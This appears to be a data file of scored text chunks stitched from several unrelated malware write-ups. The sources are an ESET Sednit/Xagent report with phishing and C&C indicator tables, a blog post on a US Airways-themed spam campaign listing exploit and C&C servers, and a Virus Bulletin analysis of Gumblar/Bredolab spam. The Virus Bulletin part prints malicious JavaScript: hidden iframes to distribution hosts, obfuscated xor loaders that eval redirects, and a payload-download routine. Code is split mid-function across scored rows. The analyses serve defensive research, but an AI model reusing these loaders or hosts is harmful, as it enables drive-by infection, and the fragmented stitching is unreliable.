"The AgentKernel can receive commands from the C&C server to interact with modules and channels. Some of the previously-seen C&C commands have been removed, and some new ones added.",0.009315141914148284
"Earlier versions supported command 2, PING_REQUEST. This has been removed in version 4 but the operator can still get the list of modules with the command GET_AGENT_INFO, which is more verbose than the previous command. Commands 34, 35 and 36 showed similarities with SET_PARAMETERS, which allows interaction with LocalStorage, which is the kernel store. It contains both file-based storage for communication with the C&C server and Microsoft registry base storage to store various configuration parameters.",0.007909781348132139
"A new feature implemented in the WinHttp channel is a Domain Generation algorithm (DGA) for fallback domains. The WinHttp channel is the channel responsible for communicating with the C&C server. Unlike the usual DGA that retrieves its seed from pseudo-random numbers, this one gets a given seed (probably generated at compilation) for a given sample. The way that domains are generated is as follows:",0.013616716259576611
"a suite of operations are applied to the seed
the result gives an offset for three different arrays (adding another seed for each array)
once the new offset is calculated (offset + seed), it decrypts the word
all words are concatenated (four words are used to generate the domain; the fourth word came from the first array but with a different offset)
the “.com” suffix is added.",0.01685669745270213
The development of the backdoor with the addition of new features and compatibility with all major platforms out there make Xagent the core backdoor used by the group.,0.01122815665472865
DealersChoice,0.009381156739031393
"DealersChoice is a platform that generates malicious documents containing embedded Adobe Flash files. Palo Alto Network researchers analyzed two variants — variant A, which is a standalone variant including Flash exploit code packaged with a payload, and variant B, which is a modular variant that loads  exploit code on demand. This new component appeared in 2016 and is still in use.",0.0172523114571137
Downdelph,0.00808007835107205
"Downdelph is a lightweight downloader developed in the Delphi programming language. As we already mentioned in our white paper, its period of activity was from November 2013 to September 2015 and there have been no new variants seen since.",0.011944907007978567
Summary,0.009602684635656611
"The Sednit group is without a doubt still an active group. The main entry point for their flagship backdoor is phishing emails, and they seem to have a great deal of success with that technique. Xagent is the core of their operation, which we can now find on any and all major  platforms, mobile or not. The newest version of Xagent is very interesting and the operators seem to have put a lot of work into it. We have seen since the discovery two instances of Xagent in the wild — one with the channel and the unknown module — one with all modules and channel but without the unknown module. We can hypothesize that the Sednit group added another layer of checking on its targets by dropping an Xagent with just a few modules and if the victim is interesting enough, it will drop another version with all modules.",0.01075758269249072
IoCs,0.007797621120042231
Table 2. Phishing,0.00994836386930864
Phishing documentSHA-1ESET detection,0.011116430332654859
Bulletin.doc68064fc152e23d56e541714af52651cb4ba81aafWin32/Sednit.AX,0.008487130140100718
f3805382ae2e23ff1147301d131a06e00e4ff75fWin32/Exploit.CVE-2016-4117.A,0.00648509583437662
OC_PSO_2017.doc512bdfe937314ac3f195c462c395feeb36932971Win32/Exploit.Agent.NUB,0.008688516221668885
NASAMS.doc30b3e8c0f3f3cf200daa21c267ffab3cad64e68bWin32/Exploit.Agent.NTR,0.008839316622529125
Programm_Details.doc4173b29a251cd9c1cab135f67cb60acab4ace0c5Win32/Exploit.Agent.NTO,0.009062669620525154
Operation_in_Mosul.rtf12a37cfdd3f3671074dd5b0f354269cec028fb52Win32/Exploit.Agent.NTR,0.009408690580834267
ARM-NATO_ENGLISH_30_NOV_2016.doc15201766bd964b7c405aeb11db81457220c31e46SWF/Agent.L,0.01221257017954025
Olympic-Agenda-2020-20-20-Recommendations.doc8078e411fbe33864dfd8f87ad5105cc1fd26d62eWin32/Exploit.Agent.BL,0.01040053436006283
Merry_Christmas!.docx33447383379ca99083442b852589111296f0c603Win32/Exploit.Agent.NUG,0.011275691354952544
Trump’s_Attack_on_Syria_English.docxd5235d136cfcadbef431eea7253d80bde414db9dWin32/Exploit.Agent.NWZ,0.009403269084271915
Hotel_Reservation_Form.docf293a2bfb728060c54efeeb03c5323893b5c80dfWin32/Sednit.BN,0.008851297956244508
SB_Doc_2017-3_Implementation_of_Key_Taskings_and_Next_Steps.docbb10ed5d59672fbc6178e35d0feac0562513e9f0Win32/Sednit.BN,0.009724536466475753
4873bafe44cff06845faa0ce7c270c4ce3c9f7b9169c8f3e3d22e192c108bc95164d362ce5437465cc7607015cd7a1a4452acd3d87adabdd7e005bd7Win32/Sednit.BN,0.009075666160546891
Caucasian_Eagle_ENG.docx5d2c7d87995cc5b8184baba2c7a1900a48b2f42dWin32/Exploit.Agent.NTM,0.008388823456314753
World War3.docx7aada8bcc0d1ab8ffb1f0fae4757789c6f5546a3SWF/Exploit.CVE-2017-11292.A,0.0072949564992313976
SaberGuardian2017.docx68c2809560c7623d2307d8797691abf3eafe319aVBA/DDE.E,0.009379704790473675
IsisAttackInNewYork.docx1c6c700ceebfbe799e115582665105caa03c5c9eVBA/DDE.L,0.010394486796917679
Table 3. Seduploader Samples,0.009847488450629549
SHA-1ESET detectionC&C server,0.010153689235958274
9f6bed7d7f4728490117cbc85819c2e6c494251bWin32/Sednit.AXservicecdp[.]com:87.236.211[.]182,0.010171476877153918
6e167da3c5d887fa2e58da848a2245d11b6c5ad6Win32/Sednit.BGrunvercheck[.]com:185.156.173[.]70 remsupport[.]org:191.101.31[.]96,0.009200441597490672
e338d49c270baf64363879e5eecb8fa6bdde8ad9Win32/Sednit.BGwmdmediacodecs[.]com:95.215.45[.]43,0.011147178995691842
f9fd3f1d8da4ffd6a494228b934549d09e3c59d1Win32/Sednit.BNmvband[.]net:89.45.67[.]144 mvtband[.]net:89.33.246[.]117,0.009988385841205094
476fc1d31722ac26b46154cbf0c631d60268b28aWin32/Sednit.BNviters[.]org:89.187.150[.]44,0.010619530171900537
8a68f26d01372114f660e32ac4c9117e5d0577f1Win32/Sednit.BNmyinvestgroup[.]com:146.185.253[.]132,0.010465324671317333
9c47ca3883196b3a84d67676a804ff50e22b0a9fWin32/Sednit.BRspace-delivery[.]com:86.106.131[.]141,0.009555224880628654
ab354807e687993fbeb1b325eb6e4ab38d428a1eWin32/Sednit.BSsatellitedeluxpanorama[.]com:89.34.111[.]160,0.010066920222706721
4bc722a9b0492a50bd86a1341f02c74c0d773db7Win32/Sednit.BSwebviewres[.]net:185.216.35[.]26,0.009347717637856134
Table 4. Xagent Samples,0.009443284111335104
SHA-1ESET detectionC&C server,0.010153689235958274
6f0fc0ebba3e4c8b26a69cdf519edf8d1aa2f4bbWin64/Sednit.Zmovieultimate[.]com,0.010877876938019893
e19f753e514f6adec8f81bcdefb9117979e69627Win64/Sednit.Zmeteost[.]com,0.009854836373268339
961468ddd3d0fa25beb8210c81ba620f9170ed30Win32/Sednit.BOfaststoragefiles[.]org,0.009035677824463462
a0719b50265505c8432616c0a4e14ed206981e95Win32/Sednit.BOnethostnet[.]com,0.00935198754709965
2cf6436b99d11d9d1e0c488af518e35162ecbc9cWin64/Sednit.Yfaststoragefiles[.]org,0.010009538427307674
fec29b4f4dccc59770c65c128dfe4564d7c13d33Win64/Sednit.Yfsportal[.]net,0.009199760257729506
57d7f3d31c491f8aef4665ca4dd905c3c8a98795Win64/Sednit.Zfastdataexchange[.]org,0.009587020517710654
a3bf5b5cf5a5ef438a198a6f61f7225c0a4a7138Win32/Sednit.BOnewfilmts[.]com,0.008862996698838832
1958e722afd0dba266576922abc98aa505cf5f9aWin32/Sednit.BOnewfilmts[.]com,0.00925669686680941
"[1] We weren’t able to match this module with previous well-known modules
",0.008689108722063965
"Cybercriminals are currently spamvertising millions of emails impersonating U.S Airways, in an attempt to trick users into clicking on the malicious links found in the legitimately looking emails. Let’s dissect the malicious campaign, and expose its dynamics.
More details:",0.011831347609037368
Sample screenshot of the spamvertised US Airways themed email:,0.010111877667271618
"Spamvertised compromised URL: hxxp://raintree.on.ca/depdetails.html
Sample client-side exploits serving URL: hxxp://blue-lotusgrove.net/main.php?page=559e008e5ed98bf7 – 203.91.113.6 (AS24559); Email: verdadress@consultant.com
Sample client-side exploits served: CVE-2010-1885
Responding to the same IP 203.91.113.6 (AS24559), are also the following malicious domains:
seneesamj.com
centennialfield.net
dushare.net
afgreenwich.net
bode-sales.net
cat-mails.net
nitor-solutions.net
gsigallery.net
atfood.ru
indyware.ru
citgbgmgrn.com
Detection rate for a sample Java script redirection: MD5: 5c5a3c6e91c1c948c735e90009886e37 – detected by 3 out of 42 antivirus scanners as Mal/Iframe-W
Upon successful client-side exploitation, the campaign drops MD5: 9069210d0758b34d8ef8679f712b48aa on the infected hosts, detected by 6 out of 42 antivirus scanners as Trojan.Winlock.6049; W32/Cridex.R
Upon execution, the sample phones back to 199.71.213.194:8080/mx/5/B/in/ (AS40676).
More MD5’s are known to have phoned back to the same IP, for instance:
MD5: 34cb2d621d61df32ae3ccf1e69007b8e
MD5: f621be555dc94a8a370940c92317d575
MD5: fd985d376b66af6e27a62ef91d7b0ce8
These MD5s also phone back to related command control servers part of the malicious campaign, such as:
173.224.208.60:8080
188.40.0.138:8080
192.220.87.172:8080
199.71.213.194:8080
200.108.18.158:8080
203.113.98.131:8080
203.172.140.202:8080
206.223.154.130:8080
219.255.134.110:8080
59.90.221.6:8080
66.242.19.36:8080
72.167.253.106:8080
72.18.203.140:8080
82.165.147.190:8080
83.238.208.55:8080
85.25.147.73:8080
The last time we intercepted the same HTML template being used in the wild, was in April 2012. Back then, we found an identical campaign structure between the US Airways themed campaign and the “Spamvertised Verizon-themed ‘Your Bill Is Now Available’ emails lead to ZeuS crimeware” ; “Spamvertised LinkedIn notifications serving client-side exploits and malware“ campaigns, leading us to the conclusion that it’s the same cybercriminal/gang of cybercriminals launching these attacks.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01280119303063687
"It's just spam, it can't hurt, right?
2010-10-01",0.018382744107500182
"Gabor Szappanos
VirusBuster
,
Hungary
Editor:
Helen",0.008952797709624427
"Martin
Abstract
One nice summer’s day, emails started flooding into Gabor Szappanos's mailbox with a spam-like message and a suspicious-looking attachment. The messages promised news on the latest FIFA World Cup scandal, so he took a look. In fact, the messages were not only distributing spam, but also members of the Bredolab family, and were doing so using the infamous Gumblar distribution architecture. Gabor describes the working of the attack.
Copyright © 2010 Virus Bulletin",0.01595880358196733
"It all began on a nice summer’s day. Emails started flooding into my mailbox with a spam-like message and a suspicious-looking attachment. The same messages were also captured in our spam traps. The messages promised news on the latest FIFA World Cup scandal, and as a soccer fan I was curious, so I took a closer look.
Having been in this business for a few years, I was not surprised to see a spam campaign riding on the back of the latest news event. On the contrary, I would have been surprised not to have seen any.
The attachment led to a redirected page, which turned out to be a pharma spam message. So it seemed that it wasn’t too dangerous, ‘just’ spam. But the means of reaching this spam was far more complicated than can reasonably be justified, leading me to believe that it couldn’t be that simple – and, as it turned out, it wasn’t.
In fact, the messages were not only distributing spam, but also members of the infamous Bredolab family. To do all of this, the even more infamous Gumblar distribution architecture was used.
There are already some excellent descriptions of the Gumblar architecture and distribution methods [1], [2], [3] so I will focus instead on the intermediate steps leading to the final system compromise. I will attempt to make clear the working of the attack, point out the role of each building block during the process, and even give a few tips on the analysis of these scripts.
The activities of the group behind this attack were observed over a period of one month, using email messages collected in multiple spam traps. I am quite sure that more distribution sites were involved in the attack than are described here, but I will enumerate only those that I could connect with certainty to the group – either using the same distribution sites or using similar methods.",0.015363503034803161
"Message bodies
The bait on the hook – the spam messages – covered a wide range of common lures: account suspension notifications, Facebook/Skype password reset requests, the promise of interesting photos, new private messages received, new e-card received, and so on. In the early days, messages promised news of the FIFA World Cup scandal as well as something that’s never missing from a large-scale seeding: the promise of pornographic content in the attachment.",0.015102578090684715
"Methods used
Over the observation period, several activation methods were observed, which are documented in this section. The beginning of the campaign was dominated by the simple replace method, and the end by the more complicated xor and xor_adv, while the plainurl method appeared at various points throughout the campaign. The rest of the methods were used only occasionally and inconsistently.
At the very beginning of the timeline there was a massive seeding, which was followed by a more moderate seeding with continuously changing distribution methods. Figure 1 illustrates the different methods used over time. The rare ones, that were used only once (repl_ind, var_loc, refresh_mal) have been omitted to make the chart clearer.
Figure 1. Distribution methods.",0.015319250069432244
"refresh
In this method the malicious code is attached to the message (as a base64-encoded attachment), and the message body attempts to persuade recipients to open it.
The attached code is a simple HTML refresh tag, usually with the first-stage dual distribution page as a target:
<meta http-equiv=”refresh” content=”0;url=http://miphillylatino.com/index3.html” />",0.011942725467345872
"refresh_enc
This method was used only once during the observation period (on 15 July), but in reasonably large number. It is essentially the same as the refresh method, the only enhancement being the URL encoding used on top of the refresh tag, in the form:
<script type=”text/javascript”>
<!-- HTML encodyd -->
<!--
document.write(unescape(‘%3C%6D%65%74%61%20%68%74%74%70%...%20%2F%3E%0A’));
//-->
</script>
The typo (‘encodyd’) is courtesy of the malware author.",0.008707440922533949
"refresh_mal
This method was used in a single case, at the end of the timeline on 22 July.
The attachment is the same script (structurally) as the one that was downloaded in most cases as the second-stage dispatcher:
PLEASE WAITING...
<meta http-equiv=”refresh” content=”4;url=http://knewname.com” />
<iframe src=’http://bellday.ru:8080/index.php?pid=10’ width=’1’ height=’1’
style=’visibility: hidden;’></iframe>
Despite consisting of only two words, the message is grammatically poor, suggesting that the author is not extremely proficient in English.",0.009240269216989172
"plainurl
It doesn’t get simpler than this: the message body itself contains the hyperlink to the first-stage distribution page, embedded into the body text:
<p style=3D”margin-top:5px;font-size:10px;color:#888888;”>
If you received this message in error and did not sign up for a Twitt=
er account, click <a href=3D’http://jimjewell.com/z.htm’>not my account</a>.
</p>",0.010764226591430615
"var_loc
Established as a very simple code in the base64 attachment, this method was in use for just two days (14 and 15 July), in between far more complicated methods, for no obvious reason.
<script language=’javascript’>
var1=49;
var2=var1;
if(var1==var2) document.location=”http://www.i-dda.com/index3.html”;
</script>",0.010543295194501479
"replace
Here, the active code is in a base64 attachment, with an enticing message body to lure the reader into opening it.
If we reduce the code to its basics, it sets document.location.href to the distribution page. But it does so in an unusual way, by defining a function class, and referencing the ‘constructor’ of the class:
<script type=’text/javascript’>
function mD(){};
mD.prototype = {
creator : function() {
var a=’http://mvblaw.com/z.htm’;
var iD=document[‘location’];
iD[‘href’]=a;
}
};
var b=new mD(); b.creator();
</script>
One of the common tricks used in this family is to refer to object methods in the form document[‘location’] instead of the more conventional document.location. The advantage of this approach is that, being a string constant, the replace trick could be used on the ‘location’, thus making analysis and detection more complicated:
document[‘l.oSc<a(t<i_oSnS’.replace(/[S_\<\(\.]/g, ‘’)];
The string constants (‘location’, ‘href’ and the URL) are used in a replace construct, which could be more sophisticated, but in this case one random character is inserted after each character in the string (the ‘random’ characters are carefully selected to avoid using any that appear in the string), and these are replaced to an empty string, as follows:
var a=’hgt,t<pG:</</gm,vgb<lGaGwg.GcGogmG/gzG.GhGtGmg’.replace(/[gJG,\<]/g, ‘’);
Furthermore, random junk do-nothing variable assignments are inserted into the code. Typical junk assignment types are the following:
this.aB=43719;
var w=new Date();
this.j=’’;
var x=function(){};
y=””;
To extract the URL used by the malware, the junk instructions must be removed. This is made easy by the fact that the random variables in these instructions are never referred to again in the code. Here, a token-highlighting text editor, like Notepad++, could prove handy, easily revealing the scope of a variable.
After that the replace instructions are resolved by removing the junk characters in the strings. Once the first sample of this kind had been analysed, a shortcut was possible. It was easy to find the garbled URL replace construct in the code (by finding the .replace instruction), then by concentrating on that single instruction it was easy to extract the URL. Even better, thanks to the shortcomings of the string obfuscation algorithm, one could almost blindly remove every second character to reach to the destination point.",0.016526199439304112
"replace_ind
This method was used on only one day, 23 June.
Basically it is the same as the replace method, but uses more sophisticated obfuscation with additional junk codes and even simple fake code constructs:
var lA=function(){return ‘lA’}
var t=false;
var i=new Array();
The schematics of the code show more advanced coding (error handling, wrapping replace to a function call):
<script type=’text/javascript’>
function main(){};
main.prototype = {construct : function() {
var _document=document;
var _window=window;
try {
window.onload=function() {
rT=_document[‘location’];
rT[‘href’]=’http://myhometourgallery.com/xxx.html’
};
}
catch(aA) {
_document.write(‘<html ><head ></head><body ></body></html>’);
var k = this;
_window[‘setTimeout’](function(){ k.construct();}, 232);
}
};
var xCG=new main(); xCG.construct();
</script>
In case the document.location.href method fails, an error handler retries it some time later (and, just to be safe, clears the content to an empty document).
Extracting the target URLs was only slightly more complicated than it was for the replace method. Instead of searching for .replace, one could look for the garbled URL. Whatever code generator the malware authors used, it had inserted a single garbage character after each character of the protected string. This made the URL easy to spot (e.g. by searching for the ‘h.t.t.p.:././’ regexp either by using a script or visually).",0.014825767234927456
"repl_dual
This method appeared surprisingly early in the timeline, and was only used on a couple of occasions. In fact, it was the earliest observed delivery method, which included access to the first-stage spam-malware landing pages. Around a day later, another delivery layer was added to this multi-stage attack, and access to the spam and malware landing page was pushed one layer further.
<script type=’text/javascript’>
function main(){};
main.prototype = {
url : function() {return ‘http://sonnose.ru:8080/index.php?pid=10’;},
construct : function() {
var _window=window;
var _document=document;
try {
var iframeobj=document[‘createElement’](‘iframe’);
iframeobj[‘setAttribute’](‘src’, this.url());
iframeobj[‘setAttribute’](‘height’, “1”);
iframeobj[‘setAttribute’](‘width’, “1”);
_document[‘body’][‘appendChild’](iframeobj);
}
catch(aU) {
_document[‘write’](‘<html ><body ></body></html>’);
_window[‘setTimeout’](function(){ this.construct() }, 319);
}
}
};
var newobj=new main(); newobj.construct();
</script>
<script type=’text/javascript’>
function main(){};main.prototype = {
construct : function() {
function _url(m, v){m.href=v;}
n=document[‘location’];
_url(n, ‘http://toldspeak.com’);
}
};
var f=new main(); f.construct();
</script>
Despite its early appearance, the code is more complex than its successors. Two script tags are present, the first for referring to the malware distribution page, opening it in a 1x1 pixel iframe, and the second for the spam distribution page. The junk instructions inserted into the code are the same as for the repl_ind method.",0.013805567252052842
"xor
This was the first of the activation methods to cause me a headache. Messages utilizing this method appeared on 1 July. An easily locatable URL was no longer present in the script. Being the lazy analyst that I am, I didn’t start dissecting the code and wasting precious hours. Instead, looking for clues, the first thing I spotted was a long string at the beginning of the code:
sF=’f3f0fcf’+’eebf6f0’+’f1b1f7e’+’dfaf9bf’+’a2bfb8f’+’7
ebeb
ef’+’a5
b0b0
e’+’8f7f6eb’+’fef4fae’
+’df2fafb’+’f6fcfef’+’3b1fcf0’+’f2b0f6f’+’1fbfae7’+’acb1f7e’+’bf2f3b8’+’a4’;
Clearly, it had to be a hex string, which I hoped contained the URL in some construct.
Another clue that I found was an xor inside the code:
return m^bI;
So to make my life easier, I assumed that the URL was stored as a static xor-encoded string. Only the key was in question, which was acquired using a known-plaintext attack. The URL should contain ‘http://’, with two repeating bytes (t and /) near each other. In the encrypted string this pattern appeared only once (eb and b0), therefore we had 0x74->0xeb and 0x2f->0xb0 transformations. Fortunately, both led to the same xor key, 0x9f. Applying this key to the string led to the text:
location.href = ‘http://whitakermedical.com/index3.html’;
Later on, I dissected the code further. It turned out that I had been lucky with the shortcut I found – had I tried to analyse the code in the traditional way, I would have stepped onto various landmines, placed in the code to make analysis more complicated.
The code was full of junk instructions. Apart from the one already listed, new elements occurred which were more complicated and realistic constructs:
var oK;if(oK == ‘fIF’){oK=0;};
var mU;if(mU!=’’ && mU!=’uHN’){mU=null};
var yU = Math.ceil(47);
var nC = Math.random();
Not only that, but the string obfuscation (discussed in the replace section) moved one step further. This time, instead of replace constructs, all sorts of (and even mixed) escape constructs were used, resulting in representations such as [‘\u0067\u0065\u0074’+unescape(‘%53%65%63%6f%6e%64%73’)] for [‘getSeconds’]. Fortunately, a tool like Malzilla can make the deobfuscation of these strings easier.
The cleaned up code has the following scheme:
<script>
var url;
url=’f3f0fcfeebf6f0f1b1f7edfaf9bfa2bfb8f7ebebefa5b0b0e8f7f6ebfef4faedf2fafbf6fcfef3b1fc
f0f2b0f6f1fbfae7acb1f7ebf2f3b8a4’;
function main(encrypted_url){
var date_act = new Date();",0.015701831464620897
"var sec_act = (date_act[‘getHours’]()*3594)+(date_act[‘getMinutes’]()*58)+date_act
[‘getSeconds’]();
var w = sec_act - sec_start;",0.014884210038927703
"if(w < 0) w = 1;
if(w > 1) w = 1;
var b = document;  //unused
var pH = ‘’;
for(var i=0; i < encrypted_url[‘length’]; i+=2){
pH+= ‘%’ + encrypted_url[‘substr’](i, 2);}
var encrypted_url = window[‘unescape’](pH);
var decrypted_url = ‘’;
for(var j=0; j < encrypted_url[‘length’]; j++){
var nextchar = encrypted_url.charCodeAt(j);",0.018660963783533213
nextchar = nextchar ^ (158 + w);,0.012097024525201339
"decrypted_url+=String[‘fromCharCode’](nextchar);
}
window[‘eval’](decrypted_url);
return decrypted_url;
}
var date_start = new Date();",0.020685457970170074
"var sec_start = (date_start[‘getHours’]()*3594)+(date_start[‘getMinutes’]()*58)+
date_start[‘getSeconds’]();",0.016939177654781368
"setTimeout(‘main(url)’, 1030);
</script>
So, the malicious URL is opened via location.href, which is activated from a setTimeOut activation. The timeout value is about one second in each of the observed cases.
The time is queried at the beginning of the code, and then again after the timeout period has expired (about 1s). If the time difference between the two is 0 (in seconds), then the xor key for decoding will be 0x9e (a bogus value); in any other case it is the correct 0x9f. If the code is modified for easier analysis by replacing the timeout with a direct call, or reducing its length, then the garbage string will be decoded instead of the URL.",0.013255898618647954
"xor_adv
At first sight, this script looked just like the xor case, even the encrypted string could be spotted, and the xor operation was also there, but the string itself did not show the pattern of repeating bytes – a clear indication that a more complex encryption (based on xor) had been used.
Fast forwarding and skipping the painful operation of cleaning and simplifying the code, the end result was this:
var string_to_decode;
string_to_decode=’b1abb8b2bab2b4baf299ad85a0fbfde7cfaeaeb7a2dff3e8b9ababa1adb9a6aea0b0
bab482acb9a99eb3b5f5aaa2bde8a1bab3a683f1e7b8b8abb7e7f9’;
var xor_key=130;
function main(encoded_string){
function string_checksum(t){
var l=0;
for(var i=2;i<t.length+2;i++){
f=t.charCodeAt(i-2);
l=l+f*t.length;
}
return new String(l);
}",0.015457112959506247
"function init_object(obj, z){
if(u_glob == null) {u_glob = {};}
if(u_glob[obj] == null) {
u_glob[obj] = new Object();
u_glob[obj].index = 0;
u_glob[obj].strval = z;}
}
function next_objindex(obj) {
if(u_glob[obj] != null) {
var zV = u_glob[obj];
var objindex = zV.index;
var eZ = zV.strval;
var b = eZ.substr(objindex, 1);
if(objindex + 1 < eZ.length) {zV.index = objindex + 1;}
else {zV.index = 0;}
return b.charCodeAt( 0);
}
}
var u_glob = null;var _String=String;",0.030107246357846895
var function_body = new String(lJ);,0.012094987432453408
"var c = ‘’;
var zZ = ‘’;
var j=0;
while(j < encoded_string.length){
zZ+= “%” + encoded_string.substr(j, 2);
j+=2;
}
var encoded_string = unescape(zZ);
var normalized_body = function_body.replace(/[^@a-z0-9A-Z_-]/g, “”);
var checksum = new String(string_checksum(normalized_body));
init_object(‘normalized_body’, normalized_body);
init_object(‘checksum’, checksum);
var lM=0;
while(lM < 10000) {
var i = encoded_string.charCodeAt(lM);
if(isNaN(i)) break;",0.020749524552111653
"i = i ^ xor_key;
i = i ^ next_objindex(‘checksum’);
i = i ^ next_objindex(‘normalized_body’);",0.013919976541048262
"c=c+String.fromCharCode(i);
lM++;}
window[‘eval’](c);
};
main(string_to_decode);",0.017158772637632325
"function lJ(nU)
{var sR=’’;var gU=’’;function y(f){var fL=new Array(); … var fEM =
Math.ceil(18);var yU=new Date();}
In short, apart from the static key, each byte of the encoded string is xor-ed with a circularly indexed byte from the normalized full function body (white spaces are removed), and the string representation of a checksum calculated over this normalized body. Obviously, the circular indexing only has an effect on the latter, as the normalized body is much longer than the encrypted string.
What I found interesting was this piece of code:
var h = new String(document.write);
if(h[indexOf](‘arity’) != -1) { return 130;}
It is located in the function which returns the xor key. It has no effect, as later in the code it will return the same value regardless. This must be the remainder of some intermediate development stage, but its exact meaning is not clear. Nevertheless, it is not the only case where debug instructions were left in the code.",0.01240007991559644
"Attack stages in detail
Although there were some exceptional cases, the vast majority of attacks followed the stages described in Figure 2, which shows the actual addresses used in one of the analysed cases (which were dead at the time of writing this article).
Figure 2. General attack scheme.
The attack progresses in many stages, starting with replaceable, short-lived pages, and going via redirections to longer lifetime spam and a malware landing page. During the observed period, the intermediate pages changed a few times, while the landing pages had lifetimes measurable in days.",0.01581354135518409
"Stage 1: email
The first stage is always an email. We will consider the most common case.
The email contains a link to a dispatcher HTML page, with dual distribution content using one of the methods described in the previous section (except repl_dual).",0.0179643775012297
"Stage 2: dispatcher
The second stage is of the same form, with the spam landing page being open via HTTP refresh. The intermediate malware distribution page is opened via a hidden iframe:
<meta http-equiv=”refresh” content=”3;url=http://mouseultra.com/” />
<iframe src=’http://cache.lamcfoundation.org:8080/index.php?pid=10’ width=’1’ height=’1’
style=’visibility: hidden;’></iframe>
At this point the spam and malware distribution forked, pointing to totally different sites. I should note that we have not observed a single overlap between the two types of sites.
Special care had to be taken when fetching the malware content with static analysis tools like wget – the distribution site returned malcode only if the referrer of the query was the spam landing site; otherwise a zero length file was received. Similar behaviour has already been reported for the Gumblar architecture.",0.012546027866283782
"Stage 3: attack selector
The returned malcode is a moderately obfuscated encrypted JavaScript, with some additional spice to it.
The string constants were garbled with the same replace trick as described earlier – with the same limitation (exactly one garbage character inserted after each character). Junk (string) variable assignments were inserted into the code, with the interesting characteristics that eventually the same assignment did appear several times in the code.
The scheme of the code is as follows:
<html><head><title>Dkxl5pxegj6fr6rcu5</title></head><body>
<div style=”visibility: hidden;”><div name=”part1” id=”part1”>7T99T114T107T96T113T102...
T37T35T64T</div>
...
<div name=”part5” id=”part5”>6T57T91T44T32T35T35T38T33T102...T118T37T38T56T7</div>",0.012395725187854367
"<script type=”text/javascript” language=”javascript”>
document.write(‘<script src=jquery.jxx?build=2.1.7></script>’);</script>",0.011144836956873072
"<script>
var encoded_string = “”;
encoded_string +=document.getElementById(“part1”).innerHTML;
...
encoded_string +=document.getElementById(“part5”).innerHTML;",0.016865875651360995
if ( typeof(separator_char) == “undefined”) separator_char = “Cpwj9is0h”;,0.0134069918850368
"function decrypt(encoded_string) {
char_array = encoded_string.split(separator_char);
var local_decoded = “”;
for (var i=0;i<char_array.length-1;i++) {
nextchar = parseInt(char_array[i]);
nextchar += 3;
local_decoded += String.fromCharCode(nextchar);
}
return(local_decoded);
}
document.write(‘<script>’);
document.write(decrypt(encoded_string););
document.write(‘</script>’);
</script></body></html>
At first sight the encrypted content is clearly a hex string, with each character separated by a ‘T’ separator, and it is stored in div tags in the HTML body, later referenced by getElementById. Then the encryption is an extremely simple increment by 3 (which changed in subsequent versions to 4 or 2).
The interesting part is the highlighted section of the code, which assigns the value ‘Cpwj9is0h’ to the separator character – not the same as the intuitively guessed ‘T’ – which is clearly nonsense. The solution is in the bolded part of the code, which is a separate script reference to jquery.jxx (commonly reported in connection with Gumblar architecture). The code fetched from this query is trivially:
eval(“separator_char =’T’;”);
Thus, if the script undergoes blind static analysis, or a dynamic analysis is performed offline, the result will be an empty string. Only if the correct separator is fetched (or guessed) can the script be decrypted.
Needless to say, the decrypted code itself is obfuscated, but only slightly (one can always observe in malware analysis that as we go deeper, the protection becomes less complicated). Only the string constants are garbled with the very same replace construct that is used throughout this malware family.
After stripping down to the basics, the first part of this script downloads the binary malware file from the URL ‘http://lib.willyselectronics.com:8080/welcome.php?id=0pid=1’ using the traditional XMLHTTP+ADODBStream method used by the Psyme downloaders.
The second part of the code downloads to an iframe an HTML page and a PDF file:
function download_pdf_html(){
pdf_array = new Array(“AcroPDF.PDF”, “PDF.PdfCtrl”);
iframe_open = ‘<iframe’);    iframe_close = ‘</iframe>’);
for(i in pdf_array)
{try {
Shkbje = new ActiveXObject(pdf_array[i]);
if (Shkbje)
{
document.write(iframe_open+’ src=”Notes1.pdf”>’+iframe_close);}
}
catch(e){}
}
try {if (navigator.javaEnabled()){
document.write(iframe_open+’ src=”Applet1.html”>’+iframe_close);}
}
catch(e){}
}
The name of the components changed (observed names included Notes10.pdf, Notes6.pdf, Applet10.html and Applet6.html). Interestingly, the Applet*.html download worked in most of the observed cases, but the sites failed to serve Notes*.pdf in most cases.
The downloaded executable is the usual Bredolab downloader. The cascade of events after executing it is already reasonably well documented [2], so we will focus on the script parts.",0.01554829018512005
"Stage 4a: PDF
The PDF file contains about four FlateDecode streams (although it could be fewer or more). All but one store binary data in ASCII hex representation, and a fifth is a decoder, obfuscated with the methods characteristic of the family, with some additional junk constructs:
xK=[“qP”,”zI”];
var vW={aD:false};
this.yZ=3491;this.yZ--;
try {var rM=’qHE’} catch(rM){};
var fO={cRU:”mP”.charCodeAt(9152)};
try {var tKX=’eTC’.substring(7397)} catch(tKX){};
mBY=24528;mBY+=247;
xU=function(qZU,fAV,eX,cZ){return qZU-fAV};",0.013241007039016095
"Furthermore, in order to reduce readability, the internal functions (also the external) in the code are used via wrapper calls that are extended to have four parameters, although they use only one or two of them.
The stripped-down decoder has the following schematic form:
var decoded_body=””;
for(i=0;i<this[‘getPageNumWords’](2);i++){
var nextbyte=this[‘getPageNthWord’](2,i);
nextbyte=String[“fromCharCode”](parseInt(substr(nextbyte,0,2),2)^180);
decoded_body=decoded_body+decode_byte(substr(nextbyte,0,2));
};
eval(decoded_body);
This decoder grabs the encoded bytes from the PDF file, applies the xor transformation with a static key (180), then executes it using eval().
Of the four FlateDecode streams, three are decoys, containing only garbage, and only one is meaningful code. (In other instances of the same threat the number of junk streams differed.)
The reason for the existence of this PDF file lies in the FlateDecode stream of about 3,000 bytes. It is almost ‘naked’ – not many obfuscation code fragments were used, but there are some complicated constructs, which are hardly distinguishable from the valuable instructions:
this.d=31777;this.d++
x={t:”j”};
var eB={};
try {var oL=’wR’.substr(12679,12679)} catch(oL){};
Notably, this is the first component where the valuable code outnumbers the junk instructions.
The code employs a handful of exploits depending on the Acrobat PDF reader version. As the conditions overlap, there may be versions where multiple exploits are launched.
If the version is above 8, util.printf will be used. If the version is below 8, the Collab.collectEmailInfo exploit is constructed. For versions below 9.1 the Collab.getIcon exploit is employed. Finally, for version 9.1 a media.newPlayer exploit is launched. The exploit codes themselves are pretty much the standard codes used for the particular vulnerability, as expected.
